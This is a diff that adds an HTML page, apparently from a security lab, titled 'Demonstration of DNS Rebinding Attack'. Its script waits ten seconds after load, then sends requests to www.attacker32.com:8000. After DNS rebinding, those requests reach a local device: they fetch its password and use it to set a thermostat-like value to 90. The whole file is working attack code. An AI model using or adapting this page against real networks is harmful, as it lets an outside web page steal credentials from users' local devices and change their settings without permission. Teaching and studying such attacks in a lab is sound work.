@@ -1,6 +1,41 @@
-<html>
+<html><head><link rel="icon" href="data:,"></head>
 <body>
-<h1>*****</h1>
 
+<h1>Demonstration of DNS Rebinding Attack</h1>
+<p><font size="5">Password: <span id="password"></span></p>
+<p><font size="5">Status:   <span id="status"></span></p>
+
+<script>
+function set_temperature(password) {
+  var sendurl= "http://www.attacker32.com:8000/settemperature?" + 
+         "value=90" + "&password="+password;
+  var Ajax=new XMLHttpRequest();
+  Ajax.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+       res = this.responseText;
+       document.getElementById("status").innerHTML = res;
+    }
+  };
+  Ajax.open("GET", sendurl, true);
+  Ajax.send();
+}
+
+function get_password() {
+  var sendurl= "http://www.attacker32.com:8000/getpassword";
+  var Ajax=new XMLHttpRequest();
+  Ajax.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      res = this.responseText;
+      document.getElementById("password").innerHTML = res;
+      set_temperature(res);
+    }
+  };
+  Ajax.open("GET", sendurl, true);
+  Ajax.send();
+}
+
+setTimeout(get_password, 10000); // Call get_password after 10 seconds 
+</script>
 </body>
-<html>
+</html>
+
